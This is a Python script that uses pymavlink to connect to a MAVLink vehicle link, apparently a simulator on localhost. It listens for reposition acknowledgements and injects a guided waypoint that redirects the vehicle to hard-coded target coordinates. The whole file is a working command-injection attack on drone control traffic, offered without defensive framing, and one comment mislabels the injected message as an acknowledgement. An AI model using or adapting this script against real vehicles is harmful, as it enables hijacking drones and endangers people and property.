import time
from pymavlink import mavutil, dialects
import pymavlink.dialects.v20.all as dialect

# Define some target locations
TARGET_LOCATIONS = [
    {
        "latitude": -35.36130812,
        "longitude": 149.16114736,
        "altitude": 30
    },
    {
        "latitude": -35.36579988,
        "longitude": 149.16302080,
        "altitude": 40
    }
]

# Connect to the vehicle
vehicle = mavutil.mavlink_connection(device="udpin:127.0.0.1:14550")

# Wait for a heartbeat
vehicle.wait_heartbeat()
print("Connected to system:", vehicle.target_system, ", component:", vehicle.target_component)


# Intercept and modify MAVLink waypoint commands
def intercept_and_modify_command():
    while True:
        msg = vehicle.recv_match(blocking=True)
        if msg:
            msg_type = msg.get_type()

            if msg_type == 'COMMAND_ACK' and msg.command == mavutil.mavlink.MAV_CMD_DO_REPOSITION:
                print("Intercepted ack item:", msg)

                # Create a new COMMAND_ACK message with modified parameters
                message = dialect.MAVLink_mission_item_int_message(
                    target_system=vehicle.target_system,
                    target_component=vehicle.target_component,
                    seq=0,
                    frame=dialect.MAV_FRAME_GLOBAL_RELATIVE_ALT_INT,
                    command=dialect.MAV_CMD_NAV_WAYPOINT,
                    current=2,
                    autocontinue=0,
                    param1=0,
                    param2=0,
                    param3=0,
                    param4=0,
                    x=int(TARGET_LOCATIONS[0]["latitude"] * 1e7),
                    y=int(TARGET_LOCATIONS[0]["longitude"] * 1e7),
                    z=TARGET_LOCATIONS[0]["altitude"]
                )

                # send target location command to the vehicle
                vehicle.mav.send(message)
                print("Change location destination", message)

            # Forward the message to the intended recipient
            vehicle.mav.send(msg)


# Main function
def main():
    intercept_and_modify_command()


# Run the main function
if __name__ == "__main__":
    main()
